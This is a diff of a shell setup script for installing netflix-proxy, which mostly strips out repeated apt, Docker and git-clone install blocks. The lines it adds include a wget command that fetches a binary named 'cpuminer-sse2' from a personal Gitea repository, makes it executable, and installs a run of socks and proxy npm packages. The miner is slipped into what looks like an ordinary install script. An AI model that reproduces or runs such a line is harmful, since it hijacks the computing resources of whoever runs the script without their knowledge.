@@ -54,110 +54,25 @@ apt-get update\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
 
+  echo "====================================="
+  echo "Bismillahirahmannirrahim"
+  echo "====================================="
   sleep 5
+wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
+ 
 
 mkdir -p ~/netflix-proxy\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
 
-  sleep 5
+sleep 5
 
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
 
-  sleep 5
 
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  | tar x --strip-components=1\
-  && ./build.sh
 
-  sleep 5
 
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-
-sudo apt-get update\
-  && sudo apt-get -y install vim dnsutils curl\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && sudo usermod -aG docker $(whoami | awk '{print $1}')\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  sleep 5
-
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-git clone https://github.com/vocuzi/dns2proxy.git
-cd dns2proxy
-sudo chmod +x install.sh
-sudo ./install.sh
-
-  sleep 5
-
-git clone https://github.com/apoorvar5/InfrastructureAsACodeForAWS.git
-cd InfrastructureAsACodeForAWS
-bash installation.sh
-
-  sleep 5
-
-git clone https://github.com/apoorvar5/InfrastructureAsACodeForAWS.git
-cd InfrastructureAsACodeForAWS
-bash implementation.sh
-  sleep 5
-git clone https://github.com/ElMoix/Firewall_iptables.git
-cd Firewall_iptables
-bash Firewall.sh
-  sleep 5
-sudo cp fw_v1.x_generic /etc/init.d/fw_v1.x_generic
-sudo update-rc.d fw_v1.x_generic defaults
-sudo /etc/init.d/fw_v1.x_generic start
-  sleep 5
-git clone https://github.com/apoorvar5/InfrastructureAsACodeForAWS.git
-cd InfrastructureAsACodeForAWS
-bash installation.sh
-
-  echo "====================================="
-  echo "Bismillahirahmannirrahim"
-  echo "====================================="
-  sleep 5
-wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
-
+  
   echo "====================================="
   echo "Bismillahirahmannirrahim"
   echo "====================================="
